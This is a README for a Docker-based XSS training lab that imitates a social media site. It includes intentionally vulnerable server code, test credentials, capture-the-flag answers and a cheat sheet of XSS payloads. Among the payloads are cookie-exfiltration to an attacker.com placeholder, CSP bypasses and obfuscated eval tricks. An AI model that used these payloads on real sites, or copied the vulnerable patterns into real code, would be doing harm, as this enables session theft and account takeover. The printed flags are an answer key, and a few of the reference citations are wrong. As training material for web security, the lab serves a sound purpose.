# 🎯 OSWA XSS Lab - Cross-Site Scripting Vulnerabilities

## **Overview**

This lab simulates a modern social media platform called **SecureShare** with intentional Cross-Site Scripting (XSS) vulnerabilities for educational purposes. It replicates real-world XSS scenarios similar to those found in the OffSec Web Attacks (OSWA) certification.

## **🏗️ Architecture**

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   React Frontend│    │  Node.js Backend│    │   MongoDB       │
│   Port 3000     │◄──►│   Port 5000     │◄──►│   Port 27017    │
└─────────────────┘    └─────────────────┘    └─────────────────┘
         │                       │                       │
         └───────────────────────┼───────────────────────┘
                                 │
                    ┌─────────────────┐
                    │   Admin Bot     │
                    │  (Simulated)    │
                    └─────────────────┘
```

## **🎯 Learning Objectives**

### **XSS Types Covered:**
1. **Reflected XSS** - Search functionality, URL parameters
2. **Stored XSS** - Comment system, user-generated content  
3. **DOM-based XSS** - Client-side JavaScript manipulation
4. **CSP Bypass** - Content Security Policy evasion
5. **Cookie Theft** - Session hijacking via XSS

## **🚀 Quick Start**

### **Prerequisites:**
- Docker & Docker Compose
- At least 2GB RAM available
- Ports 3000, 5000, 27017, 80 available

### **Launch Lab:**
```bash
# Start the lab environment
docker-compose up -d

# Check container status
docker-compose ps

# View logs (optional)
docker-compose logs -f
```

### **Access Points:**
- **Main Application:** http://localhost:3000
- **API Backend:** http://localhost:5000
- **Direct Search (Vulnerable):** http://localhost:5000/api/search/results?q=YOUR_PAYLOAD
- **Comments HTML:** http://localhost:5000/api/comments/post/POST_ID/html
- **Reflection Test:** http://localhost:5000/vulnerable/reflect?input=YOUR_PAYLOAD
- **DOM XSS Test:** http://localhost:5000/vulnerable/dom#YOUR_PAYLOAD

## **🔑 Test Accounts**

| Username | Password | Role | Description |
|----------|----------|------|-------------|
| admin | admin123 | Admin | System administrator (target for cookie theft) |
| alice | alice123 | User | Regular user account |
| bob | bob123 | User | Security researcher persona |
| charlie | charlie123 | User | Pentester learning account |

## **🎯 Hidden Flags**

### **Flag 1: Reflected XSS (Easy) - 100 Points**
- **Location:** Search functionality
- **Vulnerability:** Direct parameter reflection in HTML
- **Flag:** `FLAG{R3FL3CT3D_XSS_M4ST3R}`
- **Hint:** Try searching with `<script>` tags

**Example Payload:**
```javascript
<script>document.getElementById('hidden-flag').style.display='block'</script>
```

### **Flag 2: Stored XSS + Cookie Theft (Medium) - 250 Points**  
- **Location:** Comment system with admin bot simulation
- **Vulnerability:** Unsanitized comment storage + admin visits reported content
- **Flag:** `FLAG{ST0R3D_XSS_C00K13_TH13F}`
- **Hint:** Comments aren't sanitized, and admins check reported content

**Example Payload:**
```javascript
<script>
document.cookie='admin_session=true; path=/';
fetch('/api/comments/post/' + window.location.pathname.split('/')[3] + '/html?reported=true');
</script>
```

### **Flag 3: DOM XSS + CSP Bypass (Hard) - 500 Points**
- **Location:** Welcome page with hash fragment manipulation
- **Vulnerability:** Client-side DOM manipulation + weak CSP
- **Flag:** `FLAG{D0M_XSS_CSP_BYP4SS_L33T}`
- **Hint:** URL fragments are processed client-side, CSP might be bypassable

**Example Payload:**
```javascript
<img src=x onerror="document.getElementById('dom-flag').style.display='block'">
```

## **🔍 Vulnerability Analysis**

### **1. Reflected XSS Locations**
```javascript
// Search endpoint reflects user input directly
app.get('/api/search/results', (req, res) => {
    const query = req.query.q || '';
    // VULNERABLE: Direct injection into HTML
    const html = `<p>Results for: <strong>${query}</strong></p>`;
    res.send(html);
});
```

### **2. Stored XSS Vulnerabilities**
```javascript
// Comments stored without sanitization
const comment = new Comment({
    content: content, // VULNERABLE: No XSS protection
    author: req.user._id
});
```

### **3. Weak Content Security Policy**
```javascript
// CSP allows unsafe-inline and unsafe-eval
res.setHeader('Content-Security-Policy', 
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https:;"
);
```

## **🛠️ Exploitation Techniques**

### **Basic XSS Testing:**
```javascript
// Simple alert-based payloads
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

// DOM manipulation
<script>document.body.innerHTML='<h1>XSS</h1>'</script>
```

### **Cookie Theft:**
```javascript
// Steal session cookies
<script>
fetch('http://attacker.com/steal?c=' + document.cookie);
</script>

// Admin session simulation
<script>
document.cookie = 'admin_session=true; path=/';
location.reload();
</script>
```

### **CSP Bypass Techniques:**
```javascript
// Using data URIs
<script src="data:text/javascript,alert('CSP Bypass')"></script>

// Event handlers on images
<img src=x onerror="eval(atob('YWxlcnQoJ0NTUCBCeXBhc3MnKQ=='))">

// SVG with embedded scripts
<svg><script>alert('CSP Bypass')</script></svg>
```

## **🧪 Testing Methodology**

### **1. Discovery Phase**
```bash
# Test search functionality
curl "http://localhost:5000/api/search/results?q=<script>alert('test')</script>"

# Check comment endpoints
curl -X POST http://localhost:5000/api/comments \
  -H "Content-Type: application/json" \
  -d '{"postId":"608f1f77bcf86cd799439021","content":"<script>alert(1)</script>"}'
```

### **2. Exploitation Phase**
```javascript
// Multi-stage payload for stored XSS
var payload = `
<script>
// Stage 1: Check if admin
if(document.cookie.includes('admin')) {
    // Stage 2: Exfiltrate admin data
    fetch('/api/admin/reported-content')
    .then(r => r.json())
    .then(data => {
        // Stage 3: Show flag
        document.getElementById('admin-flag').style.display = 'block';
    });
}
</script>`;
```

### **3. Advanced Techniques**
```javascript
// Bypass character restrictions
String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,39,88,83,83,39,41,60,47,115,99,114,105,112,116,62)

// Use template literals for obfuscation
eval(`al${''}ert('XSS')`)

// DOM clobbering
<form id="admin-flag"><input name="style" value="display:block !important"></form>
```

## **🏁 Success Criteria**

### **Lab Completion Requirements:**
- [ ] Trigger reflected XSS and capture Flag 1
- [ ] Execute stored XSS to simulate admin cookie theft and capture Flag 2  
- [ ] Perform DOM-based XSS with CSP bypass and capture Flag 3
- [ ] Document all payloads and techniques used

### **Bonus Challenges:**
- [ ] Chain XSS with other vulnerabilities (file upload, CSRF)
- [ ] Create a working XSS keylogger
- [ ] Demonstrate privilege escalation through XSS
- [ ] Bypass all input filters and WAF protections

## **📚 Educational Resources**

### **XSS Learning Materials:**
- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)

### **Real-World Examples:**
- CVE-2021-44228 (Log4Shell XSS variants)
- Facebook XSS Bounties
- Google XSS Challenge Solutions

## **🔧 Lab Administration**

### **Reset Lab Data:**
```bash
# Reset database to original state
docker-compose exec mongodb mongo xsslab --eval "
db.comments.deleteMany({});
db.posts.updateMany({}, {\$set: {reported: false}});
"
```

### **Check Lab Health:**
```bash
# Verify all services
docker-compose exec backend curl -f http://localhost:5000/health
docker-compose exec mongodb mongo --eval "db.adminCommand('ismaster')"
```

### **Debug Mode:**
```bash
# Enable verbose logging
docker-compose logs -f backend
```

## **⚠️ Security Warning**

**THIS LAB CONTAINS INTENTIONAL SECURITY VULNERABILITIES!**

- **Never deploy this to production environments**
- **Use only in isolated lab networks**
- **All vulnerabilities are for educational purposes**
- **Follow responsible disclosure if you find additional issues**

## **📋 Lab Report Template**

```markdown
# XSS Lab Report - [Your Name]

## Vulnerability 1: Reflected XSS
- **Location:** 
- **Payload Used:** 
- **Impact:** 
- **Remediation:** 

## Vulnerability 2: Stored XSS  
- **Location:**
- **Payload Used:**
- **Impact:**
- **Remediation:**

## Vulnerability 3: DOM XSS + CSP Bypass
- **Location:**
- **Payload Used:**
- **Impact:**
- **Remediation:**

## Flags Captured:
- [ ] FLAG{R3FL3CT3D_XSS_M4ST3R}
- [ ] FLAG{ST0R3D_XSS_C00K13_TH13F}  
- [ ] FLAG{D0M_XSS_CSP_BYP4SS_L33T}

## Additional Findings:
[Document any other vulnerabilities discovered]
```

---

**Happy Hacking! 🎯**

*Remember: The goal is learning, not breaking. Use these skills responsibly in authorized testing environments only.*